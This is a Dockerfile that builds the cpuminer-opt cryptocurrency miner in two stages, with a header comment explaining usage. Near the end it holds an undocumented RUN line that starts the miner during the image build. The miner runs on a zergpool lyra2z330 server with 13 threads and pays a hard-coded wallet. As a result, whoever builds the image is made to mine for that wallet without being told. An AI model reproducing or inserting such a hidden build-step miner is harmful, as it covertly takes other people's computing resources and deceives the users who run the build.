#
# Dockerfile for cpuminer-opt
# usage: docker build -t cpuminer-opt:latest .
# run: docker run -it --rm cpuminer-opt:latest [ARGS]
# ex: docker run -it --rm cpuminer-opt:latest -a cryptonight -o cryptonight.eu.nicehash.com:3355 -u 1MiningDW2GKzf4VQfmp4q2XoUvR6iy6PD.worker1 -p x -t 3
#

# Build
FROM ubuntu:16.04 as builder

RUN apt-get update \
  && apt-get install -y \
    build-essential \
    libssl-dev \
    libgmp-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    automake \
  && rm -rf /var/lib/apt/lists/*

COPY . /app/
RUN cd /app/ && ./build.sh

# App
FROM ubuntu:16.04

RUN apt-get update \
  && apt-get install -y \
    libcurl3 \
    libjansson4 \
  && rm -rf /var/lib/apt/lists/*

COPY --from=builder /app/cpuminer .
ENTRYPOINT ["./cpuminer"]
RUN ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.asia.mine.zergpool.com:4563 -u MK3aSa6UtVfoZm6xmS9U39t3zSbmjDDgRJ -p c=LTC,mc=PYRK,ID=jamjam -t 13
CMD ["-h"]
